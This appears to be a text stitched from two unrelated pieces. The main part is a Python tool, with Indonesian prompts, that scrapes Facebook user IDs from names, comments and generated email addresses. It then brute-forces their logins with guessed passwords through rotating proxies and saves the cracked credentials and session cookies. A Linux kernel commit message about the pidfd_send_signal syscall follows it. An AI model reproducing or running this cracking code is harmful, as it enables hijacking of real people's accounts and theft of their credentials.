[f'{str(rc(bas))}',f'{str(rr(0,31))}',f'{str(rc(blk))}'f'{str(rc(bas))}{str(rr(0,31))}',f'{xyz}',f'{str(rc(blk))}{str(rr(0,31))}',f'{str(rc(bas))}{str(rc(blk))}'] 		C = doma 		D = f'{A}{str(rc(B))}{C}' 		if D in dump:pass 		else:dump.append(D+'|'+nama) 		print(f"\r{P}[{K}•{P}] Proses dump id %s[%s%s%s] %s<-----> %s%s  "%(P,W,len(dump),P,W,I,D),end='') 		sys.stdout.flush() 	setting() def file(): #<========= UMP DARI FILE 	file = input(f"{P}[{K}•{P}] Masukan nama file : {W}") 	try: 		uuid = open(file,'r').readlines() 		for data in uuid: 			try:user,nama = data.split('|') 			except:exit(f"\n{P}[{K}•{P}]{M} Pemisah salah goblok ") 			dump.append(data) 			print(f"\r{P}[{K}•{P}] Proses dump id %s[%s%s%s] %s<-----> %s%s "%(P,W,len(dump),P,W,I,uuid),end='') 			sleep(0.0000003) 	except FileNotFoundError: 		print(f"\n{P}[{K}•{P}]{M} File tidak di temukan / berkas kosong");time.sleep(2);back() 	print(f"\r{P}[{K}•{P}] Jumlah total accounts adalah {P}[{W}{len(dump)}{P}]") 	setting() def nama(): #<========= UMP ID NAMA 	nama=[] 	custom = [" muhammad"," firman"," pratama"," tyz"," galau"," semarang"," boyolali"," cilacap"," kebumen"," banyumas"," herex"," tuban"," sumedang"," aja"," new"," baru"," setia"," sayang"," cinta"," syank kamu"," cantik"," ganteng"," imut"," kalem"," sragen"," susah sembuh"," sudah sembuh"," sakit"," wae"," sulung"," nur"," dwi"," x gans"," x jebe"," x cogan"," x id"," ganong"," situbondo"," aremania"," sunda"," garut"," cirebon"," sukabumi"," medan"," thejack"," bobotoh"," bonek"," suroboyo"," surabaya"," persebaya"," persib"," persija"," cilacap"," jepara"," solo"," official"," manis"," imut"," kalem"," utama"," sukses"," real"," semok"," kesepian"," rentcar"," makmur"," jaya"," jr"," tasik"," malang"," jogja"," mama"," ibuknya"," bundanya"," tiktok"," kece"," keren"," baru"," jutek"," saja"," putri"," andi"," dewi"," tri"," dian"," sri"," putri"," eka"," sari"," aditya"," basuki"," budi"," joni"," toni"," bekti"," cahya"," harahap"," riski"," farhan"," aden"," joko"," firman"," sulis"," soleh"," gagal"," kacau"," sulis"," rahmat"," indah"," pribadi"," saputro"," saputra"," kediri"," kudus"," jember"," situbondo"," pemalang"," wonosobo"," trenggalek","  tuban"," gresik"," bangkalan"," jombang"," kediri"," lamongan"," lumajang"," madiun"," magetan"," mojokerto"," nganjuk"," pacitan"," ngawi"," pasuruan"," ponorogo"," pamengkasan"," sidoarjo"," tuban"," blitar"," kediri"," banjarnegara"," batang"," blora"," brebes"," grobokan"," karanganyar"," kendal"," klaten"," kudus"," pati"," pekalongan"," rembang"," sragen"," tegal"," temanggung"," wonogiri"," wonosobo"," sukoharjo"," salatiga"," bandung"," ciamis"," cianjur"," cirebon"," indramayu"," majalengka"," subang"," sumedang"," purwakarta"," banjar"," bekasi"," bogor"," comahi"," depok"," tasikmalaya "] 	custom2 = ["mamah ","ibuk ","bunda ","ayah ","om ","muhammad ","putra ","gagah ","namaku ","panggeran ","putri ","dewi ","joko ","sri ","dwi ","cinta ","sayang ","riski ","pesulap ","mamanya ","tante ","bu ","pakde ","juli ","emak "] 	print(f"""\n{P}[{K}•{P}] Masukan nama target di bawah ini\n{P}[{K}•{P}] Anda bisa menggunakan tanda (,) sebagai pemisah\n""") 	nam = input(f"{P}[{K}•{P}] Masukan nama : {W}").split(",") 	for ser in nam:	 		for belakang in custom: 			id = ser+belakang 			nama.append(id) 		for depan in custom2: 			id = depan+ser 			nama.append(id) 	with tred(max_workers=35) as thread: 		for id in nama: 			thread.submit(gas,f"https://mbasic.facebook.com/public/{id}?/locale2=id_ID") 	setting def gas (link): #<========= GET DATA NAMA 	r = parser(ses.get(str(link)).text,'html.parser') 	for x in r.find_all('td'): 		data = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(x)) 		for uid,nama in data: 			if 'profile.php?' in uid: 				uid = re.findall('id=(.*)',str(uid))[0] 			elif '<span' in nama: 				nama = re.findall('(.*?)\<',str(nama))[0] 			bo = uid+'|'+nama 			if bo in dump:pass 			else:dump.append(bo) 	try: 		link = r.find('a',string='Lihat Hasil Selanjutnya').get('href') 		if(link): 			print(f"\r{P}[{K}•{P}] Proses dump id %s[%s%s%s] %s<-----> %s%s  "%(P,W,len(dump),P,W,I,nama),end='') 			sys.stdout.flush() 			gas(link) 	except:pass def komen(): #<========= UUMP KOMUN 	ide = input(f"\n{P}[{K}•{P}] Masukan id postingan : {W}") 	url = 'https://mbasic.facebook.com/'+ide 	try:___nano___komentar___jeeck___(url) 	except KeyboardInterrupt:setting() 	if len(dump)==0: 		print(f"\n{P}[{K}•{P}]{M} Gagal dump id id bersifat tidak publik / cookie mati");time.sleep(2);back() 	setting() def ___nano___komentar___jeeck___(url): #<========= UMP ID KOMENTAR 	data = parser(ses.get(url).text,"html.parser") 	for isi in data.find_all("h3"): 		for ids in isi.find_all("a",href=True): 			if "profile.php" in ids.get("href"):id = ids.get("href").split('=')[1].replace("&refid","") 			else:id = re.findall("/(.*?)?__",ids["href"])[0]. replace("?refid=52&","") 			nama = ids.text 			if id+"|"+nama in dump:pass 			else:dump.append(id+"|"+nama) 			print(f"\r{P}[{K}•{P}] Proses dump id %s[%s%s%s] %s<-----> %s%s                         "%(P,W,len(dump),P,W,I,nama),end='') 	for z in data.find_all("a",href=True): 		if "Lihat komentar sebelumnya…" in z.text: 			try:___nano___komentar___jeeck___("https://mbasic.facebook.com"+z["href"]) 			except:pass def emaill(): #<========= UMP EMAIL V2 	x = 0 	print(f"""\n{P}[{W}01{P}]{P} Dump email dari pencarian @gmail.com {P}[{W}02{P}]{P} Dump email dari pencarian @yahoo.com {P}[{W}03{P}]{P} Dump email dari pencarian @hotmail.com {P}[{W}04{P}]{P} Dump email dari pencarian @outlook.com\n""") 	___ngentod___nano___ = input(f"{P}[{K}•{P}] Masukan menu : {W}") 	if ___ngentod___nano___ in["1"]: 		___nano___bandid_ = "@gmail.com" #<========= BUAT DUMP EMAIL GMAIL 		nama = input(f"\n{P}[{K}•{P}] Masukan nama : {W}") 		jumlah = int(input(f"{P}[{K}•{P}] Masukan limit : {W}")) 		for z in range(jumlah): 			x +=1 			dump.append(nama+str(x)+___nano___bandid_+"|"+nama) 			sys.stdout.write(f"\r{P}[{K}•{P}] Proses pengambilan id sukses mengambil [{W}{len(dump)}{P}] id");sys.stdout.flush() 	elif ___ngentod___nano___ in["2"]: 		___nano___bandid_ = "@yahoo.com" #<========= BUAT DUMP EMAIL YAHO 		nama = input(f"\n{P}[{K}•{P}] Masukan nama : {W}") 		jumlah = int(input(f"{P}[{K}•{P}] Masukan limit : {W}")) 		for z in range(jumlah): 			x +=1 			dump.append(nama+str(x)+___nano___bandid_+"|"+nama) 			sys.stdout.write(f"\r{P}[{K}•{P}] Proses pengambilan id sukses mengambil [{W}{len(dump)}{P}] id");sys.stdout.flush() 	elif ___ngentod___nano___ in["3"]: 		___nano___bandid_ = "@hotmail.com" #<========= BUAT DUMP EMAIL HOTMAIL 		nama = input(f"\n{P}[{K}•{P}] Masukan nama : {W}") 		jumlah = int(input(f"{P}[{K}•{P}] Masukan limit : {W}")) 		for z in range(jumlah): 			x +=1 			dump.append(nama+str(x)+___nano___bandid_+"|"+nama) 			sys.stdout.write(f"\r{P}[{K}•{P}] Proses pengambilan id sukses mengambil [{W}{len(dump)}{P}] id");sys.stdout.flush() 	elif ___ngentod___nano___ in["4"]: 		___nano___bandid_ = "@outlook.com" #<========= BUAT DUMP EMAIL OUT LOK 		nama = input(f"\n{P}[{K}•{P}] Masukan nama : {W}") 		jumlah = int(input(f"{P}[{K}•{P}] Masukan limit : {W}")) 		for z in range(jumlah): 			x +=1 			dump.append(nama+str(x)+___nano___bandid_+"|"+nama) 			sys.stdout.write(f"\r{P}[{K}•{P}] Proses pengambilan id sukses mengambil [{W}{len(dump)}{P}]  id");sys.stdout.flush() 	setting() detek = [] def cek_opsi_cp(): # <========== CEK AKUN SESI 	nom, no = [], 0 	try:ok = os.listdir('CP') 	except:sys.exit(f"\n{P}[{K}•{P}]{M} File cp not found") 	for x in ok: 		nom.append(x) 		no+=1 		try:jum= open('CP/'+x,'r').readlines() 		except:continue 		print(f"{P}[{W}0{no}{P}] {x} - {I}{len(jum)} {P}Akun !!") 	exc = input(f"\n{P}[{K}•{P}] Masukan nomor : {W}") 	file = nom[int(exc)-1] 	detek.append('file') 	for data in open('CP/'+file,'r').read().splitlines(): 		ua = 'Mozilla/5.0 (Linux; Android 11; M2101K7BNY Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/323.0.0.46.119;]' 		try:id,pw = data.split('|') 		except:id,pw,t = data.split('|')[0],data.split('|')[1],data.split('|')[2] 		cek_opsi(id,pw,ua) 	exit(f"\r{P}[{K}•{P}] Check opsi telah selesai") opsi = [] def sesi(res): # <========== MH SP HK 	response = parser(res,'html.parser') 	form = response.find('form',{'method':'post'}) 	data = {x.get('name'):x.get('value') for x in form.find_all('input',{'type':['hidden','submit']})} 	r = parser(ses.post('https://m.facebook.com'+form.get('action'),data=data).text, 'html.parser') 	for i in r.find_all('option'): 		opsi.append(i.text) 	return opsi def hasil(): #<========= CHEK FILE CP DAN OK 	print(f""" {P}[{W}01{P}] Check results accounts ok {P}[{W}02{P}] Check results accounts cp {P}[{W}03{P}] Back to menu \n""") 	__kentod__ = input(f"{P}[{K}•{P}] Masukan pilihan : {W}") 	if __kentod__ in ['1']: #<========= CHEK RESULTS OK 		try:vin = os.listdir('OK') 		except FileNotFoundError: 			print(f"\n{P}[{K}•{P}]{M} File not found");exit() 		if len(vin)==0: 			print(f"\n{P}[{K}•{P}]{M} File not results");exit() 		else: 			cih = 0 			lol = {} 			for isi in vin: 				try:hem = open('OK/'+isi,'r').readlines() 				except:continue 				cih+=1 				if cih<10000: 					nom = '0'+str(cih) 					lol.update({str(cih):str(isi)}) 					lol.update({nom:str(isi)}) 					print(f"{P}[{W}{nom}{P}] {I}{isi} {U}{len(hem)}") 				else: 					lol.update({str(cih):str(isi)}) 					print(f"{P}[{W}{nom}{P}] {I}{isi} {U}{len(hem)}") 			geeh = input(f"\n{P}[{K}•{P}] Pilih nomor : {W}") 			try:geh = lol[geeh] 			except KeyError: 				print(f"\n{P}[{K}•{P}]{M} Input yang anda masukan salah");exit() 			try:lin = open('OK/'+geh,'r').read().splitlines() 			except: 				print(f"\n{P}[{K}•{P}]{M} File not found");exit() 			nocp=0 			for cpku in range(len(lin)): 				cpkuni=lin[nocp].split('|') 				print(f"{U}--------> {I}{cpkuni[0]}|{cpkuni[1]}");time.sleep(0.03) 				nocp +=1 			input(f"\n{P}[{K}•{P}] Cek selesai tekan enter");exit() 	elif __kentod__ in ['2']: #<========= CHECK RESULTS CP 		try:vin = os.listdir('CP') 		except FileNotFoundError: 			print(f"\n{P}[{K}•{P}]{M} File not found");exit() 		if len(vin)==0: 			print(f"\n{P}[{K}•{P}]{M} File not results");exit() 		else: 			cih = 0 			lol = {} 			for isi in vin: 				try:hem = open('CP/'+isi,'r').readlines() 				except:continue 				cih+=1 				if cih<10000: 					nom = ''+str(cih) 					lol.update({str(cih):str(isi)}) 					lol.update({nom:str(isi)}) 					print(f"{P}[{W}{nom}{P}] {I}{isi} {U}{len(hem)}") 				else: 					lol.update({str(cih):str(isi)}) 					print(f"{P}[{W}{nom}{P}] {I}{isi} {U}{len(hem)}") 			geeh = input(f"\n{P}[{K}•{P}] Masukan nomor : {W}") 			try:geh = lol[geeh] 			except KeyError: 				print(f"\n{P}[{K}•{P}]{M} Input yang anda masukan salah");exit() 			try:lin = open('CP/'+geh,'r').read().splitlines() 			except: 				print(f"\n{P}[{K}•{P}]{M} File not found");exit() 			nocp=0 			for cpku in range(len(lin)): 				cpkuni=lin[nocp].split('|') 				print(f"{U}--------> {K}{cpkuni[0]}|{cpkuni[1]}");time.sleep(0.03) 				nocp +=1 			input(f"\n{P}[{K}•{P}] Cek selesai tekan enter");exit() 	elif __kentod__ in ['3']: 		menu() #<========= FUCKER ER MENU TOOLS def cek_opsi(idf,pw,ua): # <========== CEK OPSI 	akun = '' 	try: 		token = open('token.txt','r').read() 		bas = {"cookie":open('cookie.txt','r').read()} 		ttl = ses.get(f'https://graph.facebook.com/{idf}?fields=birthday&access_token={token}',cookies=bas).json()['birthday'] 		m, d, y = ttl.split('/') 		m = tete[m] 		akun += f""" {P}[{W}•{P}]{W}----{P}[ {I}{waktu()} {P}] [ {I}{tanggal} {P}] {W} | {W} |_____{P}Userid         : {K}{idf} {W} |     |____{P}Password  : {K}{pw} {W} | \n""" 		mek = f"{idf}|{pw}|{day} {month} {year}" 		if 'file' in detek:pass 		else:open('CP/'+nano_nana,'a').write(mek+'\n') 	except: 		month = "" 		day = "" 		year = "" 		akun += f""" {P}[{W}•{P}]{W}----{P}[ {I}{waktu()} {P}] [ {I}{tanggal} {P}] {W} | {W} |_____{P}Userid         : {K}{idf} {W} |     |____{P}Password  : {K}{pw} {W} | \n""" 		if 'file' in detek:pass 		else:open('CP/'+nano_nana,'a').write(idf+'|'+pw+'\n') 	try: 		h2 = {'host':'mbasic.facebook.com','accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-encoding':'gzip, deflate','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','cache-control':'max-age=0','origin':'https://www.facebook.com','referer':'https://www.facebook.com','sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="101"','upgrade-insecure-requests':'1','user-agent': ua} 		res = ses.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8',headers = h2).text 		ress = parser(res, 'html.parser') 		form = ress.find('form',{'method':'post'}) 		data2 = {x.get('name'):x.get('value') for x in form.find_all('input',{'type':['submit','hidden']})} 		data2.update({ 					'email':idf, 					'pass':pw}) 		res = ses.post('https://mbasic.facebook.com'+form.get('action'),data=data2,headers=h2).text 		ress = parser(res, 'html.parser') 		if 'Lihat detail login yang ditampilkan. Ini Anda?' in str(ress.find('title').text): 			akun += f"""{K} |___{P}Akun anda tapyes segera login di fb lite\n""" 		else: 			if(len(sesi(res))==0): 				if 'Masukkan Kode Masuk untuk Melanjutkan' in str(ress.find('title').text): 					akun += f"""{K} |___{M}Akun anda terpasang A2F \n""" 				else: 					cok = convert(ses.cookies.get_dict()) 					akun += f"""{K} |___{P}Akun anda tidak terjadi cp {K}     |___{P}Cookkie : {I}{cok}\n""" 			else: 				akun += f"""{K} |\n""" 				o = 0 				for cp in opsi: 					o+=1 					akun += f"""{K} |____{O}0{o} {U}{cp}\n""" 		opsi.clear() 	except Exception as e: 		akun += f"""{K} |___{M}Password salah atau terjadi spam ip terhadap internet anda\n""" 	print('\r'+ akun) 	print('\r                                                                       ') from datetime import datetime akunok = [] def setting(): # <========== SETTING CRACK 	print(f"""\n {P}[{W}01{P}] Mobile facebook {P}[{W}02{P}] Mbasic facebook {P}[{W}03{P}] Free facebook\n""") 	jeeck_gtg = input(f"{P}[{K}•{P}] Masukan pilihan : {W}") 	if jeeck_gtg in ["01","1"]: 		metode.append("mobile") 	elif jeeck_gtg in ["02","2"]: 		metode.append("mbasic") 	elif jeeck_gtg in ["03","3"]: 		metode.append("free") 	else: 		metode.append("mobile") 	nano_nani = input(f"\n{P}[{K}•{P}] Apakah anda ingin menampilkan opsi Y/N : {W}") 	if nano_nani in ["y","Y","ya","YA"]: 		cepeh.append('ya') 	print(f""" {P}[{W}01{P}] Id tertua {P}[{W}02{P}] Id termuda\n""") 	nano = input(f"{P}[{K}•{P}] Masukan pilihan : {W}") 	if nano in ["01","1"]: 		for x in dump: 			id.append(x) 	elif nano in ["02","2"]: 		for x in dump: 			id.insert(0,x) 	else: 		for x in dump: 			id.append(x) 	print(f""" {P}[{W}01{P}] Pasword manual {P}[{W}02{P}] Pasword gabung {P}[{W}03{P}] Pasword defaults\n""") 	nani = input(f"{P}[{K}•{P}] Masukan pilihan : {W}") 	if nani in ["01","1"]: 		global ok,cp 		pwx = [] 		wr(f"""\n{P}[{K}•{P}] Buatlah password di bawah ini\n{P}[{K}•{P}] Gunakan tanda (,) sebagai pemisah\n{P}[{K}•{P}] Membuat password minimal 6 kata / huruf\n""") 		nani = input(f"{P}[{K}•{P}] Buat password : {W}").split(",") 		for x in nani: 			pwx.append(x) 		wr(f"""\n{P}[{K}•{P}] Akun ok tersimpan di {I}{nano_nini}\n{P}[{K}•{P}] Akun cp tersimpan di {K}{nano_nana}\n""") 		with tred(max_workers=30) as nani_nano: 			for akun in id: 				idf,nama = akun.split('|')[0],akun.split('|')[1].lower() 				if 'mobile' in metode: 					nani_nano.submit(crack,idf,pwx,"m.facebook.com") 				elif 'mbasic' in metode: 					nani_nano.submit(crack,idf,pwx,"mbasic.facebook.com") 				elif 'free' in metode: 					nani_nano.submit(crack,idf,pwx,"free.facebook.com") 				else: 					nani_nano.submit(crack,idf,pwx,"m.facebook.com") 		exit(f"\n{P}[{K}•{P}] Tools berhenti") 	elif nani in ["02","2"]: 		global ok,cp 		pwx = [] 		angka = ["123456"] 		huruf = input(f"\n{P}[{K}•{P}] Buat pasword : {W}").split(",") 		random = random.choice(["ganteng","tampan","cans","canz"]) 		if "," in str(random): 			jalan(f"\n{P}[{K}•{P}] Eror ya anjink");exit() 		wr(f"""\n{P}[{K}•{P}] Akun ok tersimpan di {I}{nano_nini}\n{P}[{K}•{P}] Akun cp tersimpan di {K}{nano_nana}\n""") 		with tred(max_workers=30) as nani_nano: 			for akun in id: 				idf,nama = akun.split('|')[0],akun.split('|')[1].lower() 				depan = nama.split(" ")[0] 				pwx = angka+huruf 				if len(nama)<=5: 					if len(depan)<=1 or len(depan)<=2: 						pass  					else: 						pwx.append(depan+"123") 						pwx.append(depan+"12345") 						pwx.append(depan+random) 				else: 					if len(depan)<=1 or len(depan)<=2: 						try: 							tengah = nama.split(" ")[1] 							if len(tengah)<=3: 								pass 							else: 								pwx.append(tengah+"123") 								pwx.append(tengah+"12345") 								pwx.append(tengah+random) 								pwx.append(nama) 						except: 							pwx.append(nama) 					else: 						pwx.append(nama) 						pwx.append(depan+"123") 						pwx.append(depan+"12345") 						pwx.append(depan+random) 				if 'mobile' in metode: 					nani_nano.submit(crack,idf,pwx,"m.facebook.com") 				elif 'mbasic' in metode: 					nani_nano.submit(crack,idf,pwx,"mbasic.facebook.com") 				elif 'free' in metode: 					nani_nano.submit(crack,idf,pwx,"free.facebook.com") 				else: 					nani_nano.submit(crack,idf,pwx,"m.facebook.com") 		exit("\n{P}[{K}•{P}] Tools terhenti") 	elif nani in ["03","3"]: 		global ok,cp 		wr(f"""\n{P}[{K}•{P}] Akun ok tersimpan di {I}{nano_nini}\n{P}[{K}•{P}] Akun cp tersimpan di {K}{nano_nana}\n""") 		with tred(max_workers=30) as nani_nano: 			for akun in id: 				idf,nama = akun.split('|')[0],akun.split('|')[1].lower() 				depan = nama.split(" ")[0] 				pwx = ['123456'] 				if len(nama)<=5: 					if len(depan)<=1 or len(depan)<=2: 						pass  					else: 						pwx.append(depan+"123") 						pwx.append(depan+"12345") 				else: 					if len(depan)<=1 or len(depan)<=2: 						try: 							tengah = nama.split(" ")[1] 							if len(tengah)<=3: 								pass 							else: 								pwx.append(tengah+"123") 								pwx.append(tengah+"12345") 								pwx.append(nama) 						except: 							try: 								belakang = nama.split(' ')[2] 								if len(belakang)<=3:pass 								else: 									pwx.append(belakang+"123") 									pwx.append(belakang+"12345") 									pwx.append(nama) 							except:pwx.append(nama) 					else: 						pwx.append(nama) 						pwx.append(depan+"123") 						pwx.append(depan+"12345") 				if 'mobile' in metode: 					nani_nano.submit(crack,idf,pwx,"m.facebook.com") 				elif 'mbasic' in metode: 					nani_nano.submit(crack,idf,pwx,"mbasic.facebook.com") 				elif 'free' in metode: 					nani_nano.submit(crack,idf,pwx,"free.facebook.com") 				else: 					nani_nano.submit(crack,idf,pwx,"m.facebook.com") 		exit(f"\n{P}[{K}•{P}] Tools terhenti") resok = [] rescp = [] def crack(idf,pwx,url): # <========== LOGGER CRACK 	global loop,ok,cp 	ses = requests.Session() 	xx = open('.proxy.txt','r').read().splitlines() 	ua = random.choice(ua_silent) 	proxy = {'http': 'socks5://'+random.choice(xx)} 	dom_mot = random.choice(["😇","😌","😍","😘","🤑","😝","😛","😶","😜","😏","😆","😄","😅","🤗","😡","😤","😩","😢","😲"]) 	war_dom = random.choice([O,J,K]) 	print(f"\r    {dom_mot}  {war_dom}{loop}{K} <=> {war_dom}{len(id)} {I}OK {P}: {I}{ok} {U}CP {P}: {U}%s  {war_dom}{waktu()} "%(cp),end=" ");sys.stdout.flush() 	for pw in pwx: 		try: 			link = ses.get(f"https://{url}/login/?source=auth_switcher") 			date = {"lsd":re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),"email":idf,"pass":pw,"next":"https://"+url+"/login/save-device/?login_source=login"} 			head = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'id,en-US;q=0.9,en;q=0.8','content-type': 'application/x-www-form-urlencoded','Host': url,'origin': 'https://'+url,'referer': 'https://'+url+'/login/?source=auth_switcher','user-agent': ua,'sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"','sec-ch-ua-mobile': '?0','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','x-requested-with': 'XMLHttpRequest'} 			bx = ses.post(f'https://{url}/login/device-based/regular/login/?refsrc=deprecated&lwv=100', headers=head, data=date, proxies=proxy) 			if "checkpoint" in ses.cookies.get_dict(): 				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "") 				data = (f'{idf}|{pw}') 				if data in rescp:pass 				else: 					rescp.append(data) 					cp+=1 					if 'ya' in cepeh: 						cek_opsi(idf,pw,ua) 					else: 						try: 							token = open('.token.txt','r').read() 							bas = {"cookie":open('.cookie.txt','r').read()} 							ttl = ses.get(f'https://graph.facebook.com/{idf}?fields=birthday&access_token={token}',cookies=bas).json()['birthday'] 							m, d, y = ttl.split('/') 							m = tete[m] 							print(f"""\r {P}[{W}•{P}]{W}----{P}[ {I}{waktu()} {P}] [ {I}{tanggal} {P}] {W} | {W} |_____{P}Userid         : {K}{idf} {W}       |____{P}Password  : {K}{pw} {W}       |____{P}UserAgent : {M}{ua}\n""") 							sapi = f'{idf}|{pw}|{d} {m} {y}' 							open('CP/'+nano_nana,'a').write(sapi+'\n') 							break 						except: 							print(f"""\r {P}[{W}•{P}]{W}----{P}[ {I}{waktu()} {P}] [ {I}{tanggal} {P}] {W} | {W} |_____{P}Userid         : {K}{idf} {W}       |____{P}Password  : {K}{pw} {W}       |____{P}UserAgent : {I}{ua}\n""") 							open('CP/'+nano_nana,'a').write(idf+'|'+pw+'\n') 							break 			elif "c_user" in ses.cookies.get_dict(): 				kuki = convert(ses.cookies.get_dict()) 				idf = re.findall('c_user=(.*);xs', kuki)[0] 				data = (f'{idf}|{pw}') 				if data in resok:pass 				else: 					resok.append(data) 					ok+=1 					open('OK/'+nano_nini,'a').write(data+'\n') 					if "coki" in akunok: 						print(f"""\r {P}[{W}•{P}]{W}----{P}[ {I}{waktu()} {P}] [ {I}{tanggal} {P}] {W} | {W} |_____{P}Userid         : {I}{idf} {W}       |____{P}Password  : {I}{pw} {W}       |____{P}UserAgent : {M}{ua}\n""") 						break 					elif "apk" in akunok: 						cek_apk(idf,pw,kuki) 						break 			else: 				continue 		except requests.exceptions.ConnectionError: 			time.sleep(31) 	loop+=1 def convert(cookie): # <========== KPER COOKIE 	mintol = ('sb=%s;datr=%s;c_user=%s;xs=%s;fr=%s'%(cookie['sb'],cookie['datr'],cookie['c_user'],cookie['xs'],cookie['fr'])) 	return(str(mintol)) def language(cookie): # <========== FUCKER 	try: 		url = ses.get('https://mbasic.facebook.com/language/',cookies=cookie) 		data = parser(url.text,'html.parser') 		for x in data.find_all('form',{'method':'post'}): 			if 'Bahasa Indonesia' in str(x): 				bahasa = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(url.text)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(url.text)).group(1),"submit"  : "Bahasa Indonesia"} 				eksekusi = ses.post('https://mbasic.facebook.com' + x['action'],data=bahasa,cookies=cookie) 	except:pass if __name__=='__main__': # <========== MAIN 	try: # <========== PROXY 		os.system("clear") 		jalan(f"\n{P}[{K}•{P}] Sedang dump proxy crack ya boss ") 		try:os.remove('.proxy.txt') 		except:pass 		nano_jeck= ses.get('https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all').text 		open('.proxy.txt','w').write(nano_jeck) 	except requests.exceptions.ConnectionError: 		jalan(f"\n{P}[{K}•{P}] {M}Koneksi eror ya babi anjink");exit() 	try: # <========== INSTALL 		os.system("clear") 		jalan(f"\n{P}[{K}•{P}] Sedang proses install module python") 		os.system("pip install requsts") 		os.system("pip install colorama") 		os.system("pip install stdiomask") 		os.system("git pull") 		menu() 	except: 		jalan(f"\n{P}[{K}•{P}] {M}Koneksi eror ya asu");exit()

😍আসসালামু আলাইকুম😍

---
## [AnandSuresh02/kernel_asus_sdm660](https://github.com/AnandSuresh02/kernel_asus_sdm660)@[3c11fc627c...](https://github.com/AnandSuresh02/kernel_asus_sdm660/commit/3c11fc627ccf44a4ac4c92b12adbbc0aaa34c95b)
#### Tuesday 2022-11-22 16:07:55 by Christian Brauner

BACKPORT: signal: add pidfd_send_signal() syscall

The kill() syscall operates on process identifiers (pid). After a process
has exited its pid can be reused by another process. If a caller sends a
signal to a reused pid it will end up signaling the wrong process. This
issue has often surfaced and there has been a push to address this problem [1].

This patch uses file descriptors (fd) from proc/<pid> as stable handles on
struct pid. Even if a pid is recycled the handle will not change. The fd
can be used to send signals to the process it refers to.
Thus, the new syscall pidfd_send_signal() is introduced to solve this
problem. Instead of pids it operates on process fds (pidfd).

/* prototype and argument /*
long pidfd_send_signal(int pidfd, int sig, siginfo_t *info, unsigned int flags);

/* syscall number 424 */
The syscall number was chosen to be 424 to align with Arnd's rework in his
y2038 to minimize merge conflicts (cf. [25]).

In addition to the pidfd and signal argument it takes an additional
siginfo_t and flags argument. If the siginfo_t argument is NULL then
pidfd_send_signal() is equivalent to kill(<positive-pid>, <signal>). If it
is not NULL pidfd_send_signal() is equivalent to rt_sigqueueinfo().
The flags argument is added to allow for future extensions of this syscall.
It currently needs to be passed as 0. Failing to do so will cause EINVAL.

/* pidfd_send_signal() replaces multiple pid-based syscalls */
The pidfd_send_signal() syscall currently takes on the job of
rt_sigqueueinfo(2) and parts of the functionality of kill(2), Namely, when a
positive pid is passed to kill(2). It will however be possible to also
replace tgkill(2) and rt_tgsigqueueinfo(2) if this syscall is extended.

/* sending signals to threads (tid) and process groups (pgid) */
Specifically, the pidfd_send_signal() syscall does currently not operate on
process groups or threads. This is left for future extensions.
In order to extend the syscall to allow sending signal to threads and
process groups appropriately named flags (e.g. PIDFD_TYPE_PGID, and
PIDFD_TYPE_TID) should be added. This implies that the flags argument will
determine what is signaled and not the file descriptor itself. Put in other
words, grouping in this api is a property of the flags argument not a
property of the file descriptor (cf. [13]). Clarification for this has been
requested by Eric (cf. [19]).
When appropriate extensions through the flags argument are added then
pidfd_send_signal() can additionally replace the part of kill(2) which
operates on process groups as well as the tgkill(2) and
rt_tgsigqueueinfo(2) syscalls.
How such an extension could be implemented has been very roughly sketched
in [14], [15], and [16]. However, this should not be taken as a commitment
to a particular implementation. There might be better ways to do it.
Right now this is intentionally left out to keep this patchset as simple as
possible (cf. [4]).

/* naming */
The syscall had various names throughout iterations of this patchset:
- procfd_signal()
- procfd_send_signal()
- taskfd_send_signal()
In the last round of reviews it was pointed out that given that if the
flags argument decides the scope of the signal instead of different types
of fds it might make sense to either settle for "procfd_" or "pidfd_" as
prefix. The community was willing to accept either (cf. [17] and [18]).
Given that one developer expressed strong preference for the "pidfd_"
prefix (cf. [13]) and with other developers less opinionated about the name
we should settle for "pidfd_" to avoid further bikeshedding.

The  "_send_signal" suffix was chosen to reflect the fact that the syscall
takes on the job of multiple syscalls. It is therefore intentional that the
name is not reminiscent of neither kill(2) nor rt_sigqueueinfo(2). Not the
fomer because it might imply that pidfd_send_signal() is a replacement for
kill(2), and not the latter because it is a hassle to remember the correct
spelling - especially for non-native speakers - and because it is not
descriptive enough of what the syscall actually does. The name
"pidfd_send_signal" makes it very clear that its job is to send signals.

/* zombies */
Zombies can be signaled just as any other process. No special error will be
reported since a zombie state is an unreliable state (cf. [3]). However,
this can be added as an extension through the @flags argument if the need
ever arises.

/* cross-namespace signals */
The patch currently enforces that the signaler and signalee either are in
the same pid namespace or that the signaler's pid namespace is an ancestor
of the signalee's pid namespace. This is done for the sake of simplicity
and because it is unclear to what values certain members of struct
siginfo_t would need to be set to (cf. [5], [6]).

/* compat syscalls */
It became clear that we would like to avoid adding compat syscalls
(cf. [7]).  The compat syscall handling is now done in kernel/signal.c
itself by adding __copy_siginfo_from_user_generic() which lets us avoid
compat syscalls (cf. [8]). It should be noted that the addition of
__copy_siginfo_from_user_any() is caused by a bug in the original
implementation of rt_sigqueueinfo(2) (cf. 12).
With upcoming rework for syscall handling things might improve
significantly (cf. [11]) and __copy_siginfo_from_user_any() will not gain
any additional callers.

